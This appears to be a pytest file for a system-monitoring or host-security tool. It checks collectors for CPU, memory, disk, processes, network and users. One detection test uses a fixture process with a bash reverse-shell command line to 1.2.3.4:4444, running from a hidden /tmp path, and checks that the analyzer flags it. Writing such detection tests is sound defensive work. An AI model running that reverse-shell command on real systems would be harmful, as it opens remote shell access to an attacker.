import os

import metrics
from collectors import cpu, disk, memory, network, process, system, users
from collectors.disk import classify
from util import STATUSES

ENVELOPE_KEYS = {"check", "status", "severity", "timestamp", "data", "findings", "errors", "capability"}


def _valid(r):
    assert ENVELOPE_KEYS <= set(r)
    assert r["status"] in STATUSES


def test_system(ctx):
    r = system.collect(ctx)
    _valid(r)
    assert r["data"]["uptimeSeconds"] > 0 and r["data"]["kernel"]


def test_cpu(ctx):
    r = cpu.collect(ctx, interval=0.1)
    _valid(r)
    assert r["data"]["logicalCpus"] >= 1 and 0 <= r["data"]["usagePercent"] <= 100
    assert len(r["data"]["perCore"]) == r["data"]["logicalCpus"]


def test_memory(ctx):
    r = memory.collect(ctx)
    _valid(r)
    assert r["data"]["total"] > 0 and 0 <= r["data"]["percent"] <= 100


def test_disk(ctx):
    r = disk.collect(ctx)
    _valid(r)
    assert any(f["mount"] == "/" for f in r["data"]["filesystems"]) or r["data"]["filesystems"]


def test_disk_thresholds():
    th = {"warn": 80, "high": 90, "critical": 95}
    assert classify(79.9, th) is None
    assert classify(80, th) == "MEDIUM"
    assert classify(90, th) == "HIGH"
    assert classify(96, th) == "CRITICAL"


def test_process_collect(ctx):
    r = process.collect(ctx)
    _valid(r)
    assert r["data"]["count"] > 0 and r["data"]["top"]


def test_process_analyze_flags_temp_and_cmdline():
    th = {"process_cpu_high": 80, "process_mem_high": 30}
    procs = [{"pid": 999999, "ppid": 1, "name": "x", "exe": "/tmp/.x/payload", "cmdline": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
              "user": "www-data", "cpu": 1, "mem": 1, "startTime": 0, "status": "S"},
             {"pid": 999998, "ppid": 1, "name": "nginx", "exe": "/usr/sbin/nginx", "cmdline": "nginx",
              "user": "root", "cpu": 1, "mem": 1, "startTime": 0, "status": "S"}]
    types = {f["type"] for f in process.analyze(procs, th)}
    assert "process_from_temp" in types and "suspicious_cmdline" in types
    assert not any(f["evidence"].get("name") == "nginx" for f in process.analyze(procs, th))


def test_network(ctx):
    r = network.collect(ctx)
    _valid(r)
    assert r["data"]["interfaces"] and "listening" in r["data"]["counts"]


def test_users_never_expose_hashes():
    for u in users.list_users():
        assert set(u) == {"name", "uid", "gid", "home", "shell", "canLogin", "homeExists"}


def test_metrics_sample_shape():
    m = metrics.sample()
    m2 = metrics.sample()
    assert {"cpu", "memory", "disk", "load", "network", "processCount"} <= set(m)
    assert m2["network"]["rxRate"] is not None
    assert os.getpid()
